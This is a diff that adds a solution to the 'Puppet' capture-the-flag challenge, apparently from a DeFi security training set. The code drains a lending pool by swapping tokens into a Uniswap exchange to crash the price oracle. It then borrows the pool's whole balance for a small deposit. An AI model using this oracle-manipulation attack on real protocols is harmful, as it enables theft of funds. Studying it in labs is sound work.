@@ -103,6 +103,29 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let amt1 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('10'));
+        let amt2 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1000'));
+        let amt3 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('100000'));
+        console.log('AMTS A',amt1.toString(),amt2.toString(),amt3.toString());
+        let balance = await this.token.balanceOf(this.lendingPool.address);
+        console.log('BAL Pre: ',balance.toString());
+        const amount = ethers.utils.parseEther('1000');
+   
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        await this.token.approve(this.uniswapExchange.address, amount)
+        await this.uniswapExchange.tokenToEthSwapInput(amount, 1, deadline);
+
+        amt1 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('10'));
+        amt2 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1000'));
+        amt3 = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('100000'));
+        console.log('AMTS B',amt1.toString(),amt2.toString(),amt3.toString());
+
+        const borrow = ethers.utils.parseEther('100000');
+        const deposit = amt3;
+        await this.lendingPool.borrow(borrow,{value:deposit})
+        balance = await this.token.balanceOf(this.lendingPool.address);
+        console.log('BAL Post: ',balance.toString());
+        this.token.transfer(attacker.address,borrow);
     });
 
     after(async function () {
